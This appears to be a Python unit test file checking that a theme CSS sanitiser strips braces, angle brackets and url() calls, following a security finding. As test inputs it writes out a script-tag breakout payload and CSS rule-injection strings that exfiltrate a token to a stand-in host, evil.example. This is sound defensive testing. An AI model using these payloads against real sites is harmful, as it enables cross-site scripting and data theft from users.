"""
Unit tests for `checktick_app/core/theme_utils.py`.

These tests target the security-review findings:

- F16 — `sanitize_css_block` only stripped `<>`, allowing `}` breakout from a
  CSS rule. The function must also strip `{` and `}` so a malicious
  `theme_css_*` value cannot close the wrapping `[data-theme="..."] { ... }`
  rule and inject new rules (e.g. `background-image: url(...)` exfiltration).
"""

from __future__ import annotations

from checktick_app.core.theme_utils import (
    sanitize_css_block,
    sanitize_font_family,
)


# ---------------------------------------------------------------------------
# F16 — sanitize_css_block must strip { } as well as < >
# ---------------------------------------------------------------------------


def test_sanitize_css_block_strips_angle_brackets():
    """`</style>` breakout must remain blocked (regression guard)."""
    payload = "</style><script>alert(1)</script><style>x{color:red}"
    out = sanitize_css_block(payload)
    assert "<" not in out
    assert ">" not in out
    assert "</style>" not in out
    assert "<script>" not in out


def test_sanitize_css_block_strips_curly_braces():
    """
    F16: a `}` character must be stripped so it cannot close the wrapping
    `[data-theme="..."] { ... }` rule and inject new CSS rules.
    """
    payload = "} [data-theme='custom'] { background: url(https://evil.example/?leak=) }"
    out = sanitize_css_block(payload)
    assert "{" not in out, (
        f"sanitize_css_block must strip `{{` to prevent rule injection; got: {out!r}"
    )
    assert "}" not in out, (
        f"sanitize_css_block must strip `}}` to prevent rule breakout; got: {out!r}"
    )


def test_sanitize_css_block_preserves_safe_css_values():
    """Safe CSS variable declarations must survive sanitisation."""
    payload = "  --p: oklch(0.7 0.15 250);\n  --b1: #ffffff;"
    out = sanitize_css_block(payload)
    assert "--p: oklch(0.7 0.15 250);" in out
    assert "--b1: #ffffff;" in out


def test_sanitize_css_block_strips_brace_breakout_combined_with_url():
    """
    F16 + F9 combined scenario: a payload that tries to break out of the rule
    AND exfiltrate via url() must have its braces stripped so the breakout
    fails, AND its url() reference stripped so the exfiltration URL is not
    loaded even inside the wrapping rule's value context.
    """
    payload = "} body { background: url(https://evil.example/?leak=token) }"
    out = sanitize_css_block(payload)
    # The breakout characters must be gone.
    assert "{" not in out
    assert "}" not in out
    # The exfiltration URL must not survive as a usable url() reference.
    assert "url(" not in out.lower()
    assert "evil.example" not in out


# ---------------------------------------------------------------------------
# Regression guard — sanitize_font_family still safe
# ---------------------------------------------------------------------------


def test_sanitize_font_family_strips_curly_braces():
    """Font-family must also reject `{` / `}` (defence in depth)."""
    out = sanitize_font_family("Arial } body { background: url(evil) } sans-serif")
    assert "{" not in str(out)
    assert "}" not in str(out)
